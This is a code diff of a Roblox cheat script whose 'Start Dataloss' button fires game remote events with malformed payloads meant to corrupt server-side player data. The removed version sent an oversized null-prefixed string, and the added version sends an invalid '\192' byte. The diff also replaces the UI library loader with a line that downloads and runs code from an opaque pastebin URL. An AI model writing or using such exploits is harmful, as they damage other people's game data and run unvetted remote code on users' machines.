@@ -1,13 +1,13 @@
-local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
+local Material = loadstring(game:HttpGet("https://pastebin.com/raw/n3Z9V85a"))()
 
 local X = Material.Load({
     Title = "AFS - tobias020108back.",
     Style = 3,
     SizeX = 500,
     SizeY = 350,
-    Theme = "Dark",
+    Theme = "Light",
     ColorOverrides = {
-        MainFrame = Color3.fromRGB(35,35,35)
+        MainFrame = Color3.fromRGB(255,255,255),
     }
 })
 
@@ -19,14 +19,13 @@ local A = Y.Button({
     Text = "You have not selected any Dataloss Type",
     Callback = function()
         if Type == "Start Dataloss" then
-local args = {
-    [1] = "\0" .. string.rep("B", 4200000)
-}
-
-game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("SetTutorialDone"):FireServer(unpack(args))
+            game:GetService("ReplicatedStorage").Remote.SetDungeonSetting:FireServer("Theme",  "\192")
             TextField:SetText("Started")
+        elseif Type == "Undo Dataloss" then
+            game:GetService("ReplicatedStorage").Remote.SetDungeonSetting:FireServer("Theme", "Naruto")
+            TextField:SetText("Undone")
+        end
     end
-end
 })
 
 local D = Y.Dropdown({
@@ -36,18 +35,15 @@ local D = Y.Dropdown({
     end,
     Options = {
         "Start Dataloss",
+        "Undo Dataloss"
     }
 })
-
 
 
 getgenv().TextField = Y.TextField({
     Text = "Status",
     Type = "Default"
 })
-
-
-
 
 while task.wait() do
     if Type then
